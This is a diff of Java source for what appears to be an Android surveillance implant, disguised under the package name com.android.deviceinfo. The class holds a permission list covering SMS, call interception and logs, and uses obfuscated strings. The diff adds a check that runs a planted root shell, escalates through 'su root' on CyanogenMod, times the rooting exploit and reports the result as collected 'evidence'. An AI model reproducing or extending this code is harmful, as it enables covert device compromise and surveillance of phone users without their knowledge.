@@ -12,6 +12,7 @@ import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.util.ArrayList;
+import java.util.Date;
 import java.util.Iterator;
 
 import javax.xml.parsers.FactoryConfigurationError;
@@ -21,9 +22,12 @@ import org.xml.sax.SAXException;
 
 import android.content.Context;
 
+import com.android.deviceinfo.Root;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.Configuration;
+import com.android.deviceinfo.crypto.Keys;
+import com.android.deviceinfo.evidence.EvidenceReference;
 import com.android.deviceinfo.file.AutoFile;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.Execute;
@@ -33,12 +37,13 @@ import com.android.m.M;
 public class PackageInfo {
 	private static final String TAG = "PackageInfo";
 
+	private static boolean sentInfo;
+
 	private String packageName;
 	private FileInputStream fin;
 	private XmlParser xml;
 
-	private String requiredPerms[] = { 
-			"android.permission.READ_LOGS", "android.permission.READ_SMS",
+	private String requiredPerms[] = { "android.permission.READ_LOGS", "android.permission.READ_SMS",
 			"android.permission.SET_WALLPAPER", "android.permission.SEND_SMS",
 			"android.permission.PROCESS_OUTGOING_CALLS", "android.permission.WRITE_APN_SETTINGS",
 			"android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.WRITE_SMS",
@@ -68,7 +73,7 @@ public class PackageInfo {
 	static public String getPackageName() {
 		return Status.getAppContext().getPackageName();
 	}
-	
+
 	private ArrayList<String> getPackagePermissions() {
 		return this.xml.getPackagePermissions(this.packageName);
 	}
@@ -132,22 +137,42 @@ public class PackageInfo {
 		try {
 			// Verifichiamo di essere root
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (checkRoot), " + Configuration.shellFile);
+				Check.log(TAG + " (checkRoot), " + Configuration.shellFileBase);
 			}
-			final AutoFile file = new AutoFile(Configuration.shellFile);
+			final AutoFile file = new AutoFile(Configuration.shellFileBase);
 
 			if (file.exists() && file.canRead()) {
-				
-				// 32_14= air
-				final Process p = Runtime.getRuntime().exec(Configuration.shellFile + M.e(" air"));
-				p.waitFor();
 
-				if (p.exitValue() == 1) {
+				if (Root.checkCyanogenmod() && Keys.self().wantsPrivilege()) {
+					if (Cfg.SUPPORT_CYANOGENMOD) {
+						Configuration.shellFile = M.e("su root ") + Configuration.shellFileBase;
+					}
+				}
+
+				final ExecuteResult p = Execute.execute(Configuration.shellFile + M.e(" qzx id"));
+				String stdout = p.getStdout();
+				if (stdout.startsWith("uid=0")) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (checkRoot): isRoot YEAHHHHH"); //$NON-NLS-1$ //$NON-NLS-2$
+
+						Date timestamp = new Date();
+						long diff = (timestamp.getTime() - Root.startExploiting.getTime()) / 1000;
+
+						if (!sentInfo) {
+							EvidenceReference.info("Root: " + Root.method + " time: " + diff + "s");
+						}
+						sentInfo = true;
 					}
 
 					isRoot = true;
+				} else {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (checkRoot): isRoot NOOOOO"); //$NON-NLS-1$ //$NON-NLS-2$
+						if (!sentInfo) {
+							EvidenceReference.info("Root: NO");
+						}
+						sentInfo = true;
+					}
 				}
 			}
 		} catch (final Exception e) {
@@ -162,22 +187,22 @@ public class PackageInfo {
 
 		return isRoot;
 	}
-	
+
 	static public boolean hasSu() {
 		if (checkRootPackages() == true) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (hasSu): checkRootPackages true"); //$NON-NLS-1$
-			}			
+			}
 			return true;
 		}
-		
+
 		if (checkDebugBuild() == true) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (hasSu): checkDebugBuild true"); //$NON-NLS-1$
-			}			
+			}
 			return true;
 		}
-		
+
 		return false;
 	}
 
@@ -190,7 +215,7 @@ public class PackageInfo {
 		if (i == null) {
 			return false;
 		}
-		
+
 		while (i.hasNext()) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (checkSuBinary): " + i.next()); //$NON-NLS-1$
@@ -205,39 +230,39 @@ public class PackageInfo {
 			Check.log(TAG + " (checkRootPackages)");
 		}
 		try {
-			//32_39=/system/app/Superuser.apk			
-            File file = new File(M.e("/system/app/Superuser.apk"));            
-            if (file.exists()) {
-                return true;
-            }
-            
-            //32_40=/data/app/com.noshufou.android.su-1.apk
-            file = new File(M.e("/data/app/com.noshufou.android.su-1.apk"));
-            if (file.exists()) {
-                return true;
-            }
-            
-            //32_41=/data/app/com.noshufou.android.su-2.apk
-            file = new File(M.e("/data/app/com.noshufou.android.su-2.apk"));
-            if (file.exists()) {
-                return true;
-            }
-            
-            //32_42=/system/bin/su
-            file = new File(M.e("/system/bin/su"));
-            if (file.exists()) {
-                return true;
-            }
-		} catch (Exception e) { 
-        	if (Cfg.EXCEPTION) {
-        		Check.log(e);
-        	}
-        }
+			// 32_39=/system/app/Superuser.apk
+			File file = new File(M.e("/system/app/Superuser.apk"));
+			if (file.exists()) {
+				return true;
+			}
+
+			// 32_40=/data/app/com.noshufou.android.su-1.apk
+			file = new File(M.e("/data/app/com.noshufou.android.su-1.apk"));
+			if (file.exists()) {
+				return true;
+			}
+
+			// 32_41=/data/app/com.noshufou.android.su-2.apk
+			file = new File(M.e("/data/app/com.noshufou.android.su-2.apk"));
+			if (file.exists()) {
+				return true;
+			}
+
+			// 32_42=/system/bin/su
+			file = new File(M.e("/system/bin/su"));
+			if (file.exists()) {
+				return true;
+			}
+		} catch (Exception e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+		}
 
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (checkRootPackages), no root found");
 		}
-        return false;
+		return false;
 	}
 
 	private static boolean checkDebugBuild() {
@@ -246,10 +271,10 @@ public class PackageInfo {
 		}
 		String buildTags = android.os.Build.TAGS;
 
-        if (buildTags != null && buildTags.contains("test-keys")) {
-            return true;
-        }
-        
-        return false;
+		if (buildTags != null && buildTags.contains("test-keys")) {
+			return true;
+		}
+
+		return false;
 	}
 }
